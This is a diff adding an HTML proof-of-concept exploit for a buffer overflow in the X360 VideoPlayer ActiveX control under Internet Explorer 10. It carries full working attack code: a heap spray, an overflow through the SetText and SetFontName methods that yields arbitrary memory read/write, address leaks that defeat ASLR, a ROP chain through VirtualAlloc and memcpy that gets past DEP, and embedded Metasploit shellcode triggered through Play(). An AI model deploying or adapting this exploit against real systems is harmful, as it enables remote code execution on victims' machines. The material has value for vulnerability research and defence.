@@ -1,0 +1,272 @@
+<!DOCTYPE HTML>
+
+<!--
+
+
+###############################################################################
+*
+* Exploit Title: X360 VideoPlayer ActiveX Control RCE Full ASLR & DEP Bypass
+* Author: Rh0
+* Date: Jan 30 2015
+* Affected Software: X360 VideoPlayer ActiveX Control 2.6 (VideoPlayer.ocx)
+* Vulnerability: Buffer Overflow in Data Section
+* Tested on: Internet Explorer 10 32-bit (Windows 7 64-bit in VirtualBox)
+* Software Links:
+  http://www.x360soft.com/demo/videoplayersetup.exe
+  http://download.cnet.com/X360-Video-Player-ActiveX-Control/3000-2170_4-10581185.html
+
+* Detailed writeup: https://rh0dev.github.io/blog/2015/fun-with-info-leaks/
+*
+###############################################################################
+
+
+* Information about VideoPlayer.ocx *
+###################################
+
+md5sum: f9f2d32ae0e4d7b5c19692d0753451fb
+
+Class VideoPlayer
+GUID: {4B3476C6-185A-4D19-BB09-718B565FA67B}
+Number of Interfaces: 1
+Default Interface: _DVideoPlayer
+RegKey Safe for Script: True
+RegkeySafe for Init: True
+KillBitSet: False
+
+* NOTES *
+#########
+
+*) When passing an overlong string to the ActiveX object's "SetText" method, a
+buffer overflow in the data section occurs. It allows overwriting a subsequent
+pointer that can be used in a controlled memcpy when dispatching the object's
+"SetFontName" method. With this arbitrary write, array structures can be
+manipulated to gain access to complete process memory. Equipped with this
+capability, necessary information can be leaked and manipulated to execute
+arbitrary code remotely.
+*) Comment in the alert messages to see some leaks ;)
+*) This is PoC Code: If it does not work for you, clear IE's history and try
+again. Tested against mshtml.dll and jscript9.dll version 10.0.9200.17183
+
+
+*) Inspired by:
+"http://blog.exodusintel.com/2013/12/09/a-browser-is-only-as-strong-as-its-weakest-byte-part-2/"
+"http://ifsec.blogspot.de/2013/11/exploiting-internet-explorer-11-64-bit.html"
+"https://cansecwest.com/slides/2014/The Art of Leaks - read version - Yoyo.pdf"
+"https://cansecwest.com/slides/2014/ROPs_are_for_the_99_CanSecWest_2014.pdf"
+"https://github.com/exp-sky/HitCon-2014-IE-11-0day-Windows-8.1-Exploit/blob/master/IE 11 0day & Windows 8.1 Exploit.pdf"
+
+-->
+
+<html>
+<body>
+<button onclick=run()>runme</button>
+<script>
+function run(){
+    /* VideoPlayer.ocx image has the rebase flag set =>
+       It's mapped to another base per process run */
+    /* create its vulnerable ActiveX object (as HTMLObjectElement) */
+    var obj = document.createElement("object");
+    obj.setAttribute("classid", "clsid:4B3476C6-185A-4D19-BB09-718B565FA67B");
+
+    /* amount of arrays to create on the heap */
+    nrArrays = 0x1000
+
+    /* size of data in one array block: 0xefe0 bytes =>
+       subract array header (0x20) and space for typed array headers (0x1000)
+       from 0x10000 */
+    arrSize =  (0x10000-0x20-0x1000)/4
+
+    /* heap array container will hold our heap sprayed data */
+    arr = new Array(nrArrays)
+
+    /* use one buffer for all typed arrays */
+    intArrBuf = new ArrayBuffer(4)
+    
+    /* spray the heap with array data blocks and subsequent typed array headers
+       of type Uint32Array */
+    k = 0
+    while(k < nrArrays){
+        /* create "jscript9!Js::JavascriptArray" with blocksize 0xf000 (data
+           aligned at 0xXXXX0020) */
+        arr[k] = new Array(arrSize);
+        /* fill remaining page (0x1000) after array data with headers of
+           "jscript9!Js::TypedArray<unsigned int>"  (0x55 * 0x30 = 0xff0) as a
+           typed array header has the size of 0x30. 0x10 bytes are left empty */
+        for(var i= 0; i<0x55; i++){
+            /* headers become aligned @ 0xXXXXf000, 0xXXXXf030, 0xXXXXf060,.. */
+            arr[k][i] = new Uint32Array(intArrBuf, 0, 1);
+        }
+        /* tag the array's last element */
+        arr[k][arrSize - 1] = 0x12121212
+        k += 1;
+    }
+
+    /* perform controlled memwrite to 0x1111f010: typed array header is at
+       0x1111f000 to 0x1111f030 => overwrite array data header @ 11111f010 with
+       0x00000001 0x00000004 0x00000040 0x1111f030 0x00
+       The first 3 dwords are sideeffects due to the code we abuse for the
+       controlled memcpy */
+    addr = 0x1111f010  // WHERE TO WRITE
+    /* prepare buffer with address we want to write to */
+    ptrBuf = ""
+    /* fill buffer: length = relative pointer address - buffer start + pointer
+       offset */
+    while (ptrBuf.length < (0x92068 - 0x916a8 + 0xC)){ptrBuf += "A"}
+    ptrBuf += dword2str(addr)
+
+    /* trigger: overflow buffer and overwrite the pointer value after buffer */
+    obj.SetText(ptrBuf,0,0)
+    //alert("buffer overflown => check PTR @ videop_1+92068: dc videop_1+92068")
+
+    /* use overwritten pointer after buffer with method "SetFontName" to conduct
+       memory write.  We overwrite a typed array's header length to 0x40 and let
+       its buffer point to the next typed array header at 0x1111f030 (see above)
+       */
+    obj.SetFontName(dword2str(addr+0x20)) // WHAT TO WRITE
+
+    /* find the corrupted Uint32Array (typed array) */
+    k = 0
+    arrCorrupt = 0
+    while(k < 0x1000-1){
+        for(var i = 0; i < 0x55-1; i++){
+            if(arr[k][i][0] != 0){
+                // address of jscript9!Js::TypedArray<unsigned int>::`vftable'
+                //alert("0x" + arr[k][i][0].toString(16))
+                arrCorrupt = 1
+                break
+            }
+        }
+        if (arrCorrupt == 1) break
+        k++
+    }
+
+    if (!arrCorrupt){
+        alert("cannot find corrupted Uint32Array")
+        return -1
+    }
+
+    /* modify subsequent Uint32Array to be able to RW all process memory */
+    arr[k][i][6] = 0x7fffffff // next Uint32Array length
+    arr[k][i][7] = 0 // set buffer of next Uint32Array to start of process mem
+
+    /* our memory READWRITE interface :) */
+    mem = arr[k][i+1]
+    //alert(mem.length.toString(16))
+    if (mem.length != 0x7fffffff){
+        alert("Cannot change Uint32Array length")
+        return -2
+    }
+    /* now we could even repair the change we did with memcpy ... */
+    
+    /* leak several pointers and calculate VideoPlayer.ocx base */
+    arr[k+1][0] = obj // set HTMLObjectElement as first element
+    //alert(mem[0x11120020/4].toString(16))
+    arrayElemPtr = mem[(addr + 0x1010)/4] // leak array elem. @ 0x11120020 (obj)
+    objPtr = mem[arrayElemPtr/4 + 6] // deref array elem. + 0x18
+    heapPtrVideoplayer = mem[objPtr/4 + 25] // deref HTMLObjectElement + 0x64
+    /* deref heap pointer containing VideoPlayer.ocx pointer */
+    videoplayerPtr = mem[heapPtrVideoplayer/4] 
+    base = videoplayerPtr - 0x6b3b0 // calculate base
+
+    /* check if we have the image of VideoPlayer.ocx
+       check for MZ9000 header and "Vide" string at offset 0x6a000 */
+    if (mem[base/4] != 0x905a4d ||
+        mem[(base+0x6a000)/4] != 0x65646956){
+        alert("Cannot find VideoPlayer.ocx base or its version is wrong")
+        return -3
+    }
+    //alert(base.toString(16))
+
+    /* get VirtualAlloc from imports of VideoPlayer.ocx */
+    virtualAlloc = mem[(base + 0x69174)/4]
+    /* memcpy is available inside VideoPlayer.ocx */
+    memcpy = base + 0x15070
+    //alert("0x" + virtualAlloc.toString(16) + " " + 0x" + memcpy.toString(16))
+    
+    /* create shellcode (./msfvenom -p windows/exec cmd=calc) */
+    sc = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"+
+    "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"+
+    "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"+
+    "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"+
+    "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"+
+    "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"+
+    "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"+
+    "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"+
+    "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"+
+    "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"+
+    "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"+
+    "\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b"+
+    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd"+
+    "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"+
+    "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"+
+    "\x00"
+
+    scBuf = new Uint8Array(sc.length)
+    for (n=0; n<sc.length; n++){
+        scBuf[n] = sc.charCodeAt(n)
+    }
+
+    /* leak shellcode address */
+    arr[k+1][0] = scBuf
+    /* therefore, leak array element at 0x11120020 (typed array header of
+       Uint8Array containing shellcode) ... */
+    elemPtr = mem[(addr + 0x1010)/4] 
+    /* ...and deref array element + 0x1c (=> leak shellcode's buffer address) */
+    scAddr = mem[(elemPtr/4) + 7] 
+    //alert(scAddr.toString(16))
+
+    /* create and leak rop buffer */
+    rop = new Uint32Array(0x1000)
+    arr[k+1][0] = rop
+    /* leak array element at 0x11120020 (typed array header) */
+    elemPtr = mem[(addr + 0x1010)/4] 
+    /* deref array element + 0x1c (leak rop's buffer address) */
+    pAddr = mem[(elemPtr/4) + 7]  // payload address
+
+    /* ROP chain (rets in comments are omitted) */
+    /* we perform:
+       (void*) EAX = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_RWX)
+       memcpy(EAX, shellcode, shellcodeLen)
+       (void(*)())EAX() */
+    offs = 0x30/4           // offset to chain after CALL [EAX+0x30]
+    rop[0] = base + 0x1ff6           // ADD ESP, 0x30;
+    rop[offs + 0x0] = base + 0x1ea1e // XCHG EAX, ESP; <-- first gadget called 
+    rop[offs + 0x1] = virtualAlloc   // allocate RWX mem (address avail. in EAX)
+    rop[offs + 0x2] = base + 0x10e9  // POP ECX; => pop the value at offs + 0x7
+    rop[offs + 0x3] = 0              // lpAddress
+    rop[offs + 0x4] = 0x1000         // dwSize (0x1000)
+    rop[offs + 0x5] = 0x1000         // flAllocationType (MEM_COMMIT)
+    rop[offs + 0x6] = 0x40           // flProtect (PAGE_EXECUTE_READWRITE)
+    rop[offs + 0x7] = pAddr + (offs+0xe)*4  // points to memcpy's dst param (*2)
+    rop[offs + 0x8] = base + 0x1c743 // MOV [ECX], EAX; => set dst to RWX mem
+    rop[offs + 0x9] = base + 0x10e9  // POP ECX;
+    rop[offs + 0xa] = pAddr + (offs+0xd)*4  // points to (*1) in chain
+    rop[offs + 0xb] = base + 0x1c743 // MOV [ECX], EAX; => set return to RWX mem
+    rop[offs + 0xc] = memcpy
+    rop[offs + 0xd] = 0xffffffff  // (*1): ret addr to RWX mem filled at runtime
+    rop[offs + 0xe] = 0xffffffff  // (*2): dst for memcpy filled at runtime
+    rop[offs + 0xf] = scAddr   // shellcode src addr to copy to RWX mem (param2)
+    rop[offs + 0x10] = sc.length     // length  of shellcode (param3)
+
+    /* manipulate object data to gain EIP control with "Play" method */
+    videopObj = mem[objPtr/4 + 26]
+    mem[(videopObj-0x10)/4] = pAddr // pAddr will be used in EAX in below call
+
+    /* eip control @ VideoPlayer.ocx + 0x6643B: CALL DWORD PTR [EAX+0x30] */
+    obj.Play() 
+
+}
+
+/* dword to little endian string */
+function dword2str(dword){
+    str = ""
+    for (n=0; n<4; n++){
+        str += String.fromCharCode((dword >> 8*n) & 0xff)
+    }
+    return str
+
+}
+//setTimeout(run(), 3000);
+</script>
+</body>
+</html>
